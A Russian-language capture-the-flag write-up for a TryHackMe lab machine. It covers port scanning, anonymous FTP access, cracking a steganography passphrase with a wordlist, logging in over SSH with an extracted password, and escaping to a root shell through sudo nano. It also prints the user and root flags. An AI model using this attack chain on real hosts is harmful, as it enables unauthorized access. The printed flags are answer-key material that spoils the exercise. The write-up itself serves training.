[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Brooklyn Nine Nine](https://tryhackme.com/r/room/brooklynninenine) 

Всего 1 заданиe:
## Задание 1
Эта комната предназначена для хакеров начального уровня, но любой может попытаться взломать этот ящик. Существует 
два основных предполагаемых способа получить права root на ящике. Если вы найдете больше, напишите мне в Discord на 
Fsociety2006.  

### Ответьте на вопросы ниже

```commandline
nmap -Pn -sC -sV -A -p- 10.10.96.83 -oN nmap_result
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.55.144
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


```commandline
ftp 10.10.96.83         
Connected to 10.10.96.83.
220 (vsFTPd 3.0.3)
Name (10.10.96.83:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> get note_to_jake.txt
```

```commandline
cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

```commandline
steghide extract -sf brooklyn99.jpg                            
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

```commandline
$ stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt

Successfully cracked file with password: admin
Tried 20651 passwords
Your file has been written to: brooklyn99.jpg.out
admin

$ steghide extract -sf brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to "note.txt".
```

```commandline
cat note.txt

Holts Password:
fluffydog12@ninenine

Enjoy!!
```

```commandline
ssh holt@10.10.96.83
holt@10.10.96.83's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ cat user.txt
```
Пользовательский флаг
```commandline
ee11cbb19052e40b07aac0ca060c23ee
```

```commandline
$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
    
$ sudo /bin/nano

Ctrl + R + X 
reset; sh 1>&0 2>&0


ls -l /root/root.txt
-rw-r--r-- 1 root root 135 May 18  2020 /root/root.txt
# cat /root/root.txt
```

Корневой флаг
```commandline
63a9f0ea7bb98050796b649e85481845
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)